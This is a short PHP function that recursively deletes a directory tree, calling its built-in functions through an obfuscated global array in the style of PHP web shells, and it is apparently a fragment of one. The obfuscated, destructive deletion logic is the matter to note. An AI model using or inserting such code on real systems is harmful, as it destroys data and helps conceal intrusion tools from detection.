function delete_recursive($dir)
{
    global $A;
    if (!$A[4]($dir)) {
        return false;
    }
    $files = array_diff($A[2]($dir), array('.', '..'));
    foreach ($files as $file) {
        ($A[4]("$dir/$file")) ? delete_recursive("$dir/$file") : $A[21]("$dir/$file");
    }
    return $A[22]($dir);
}


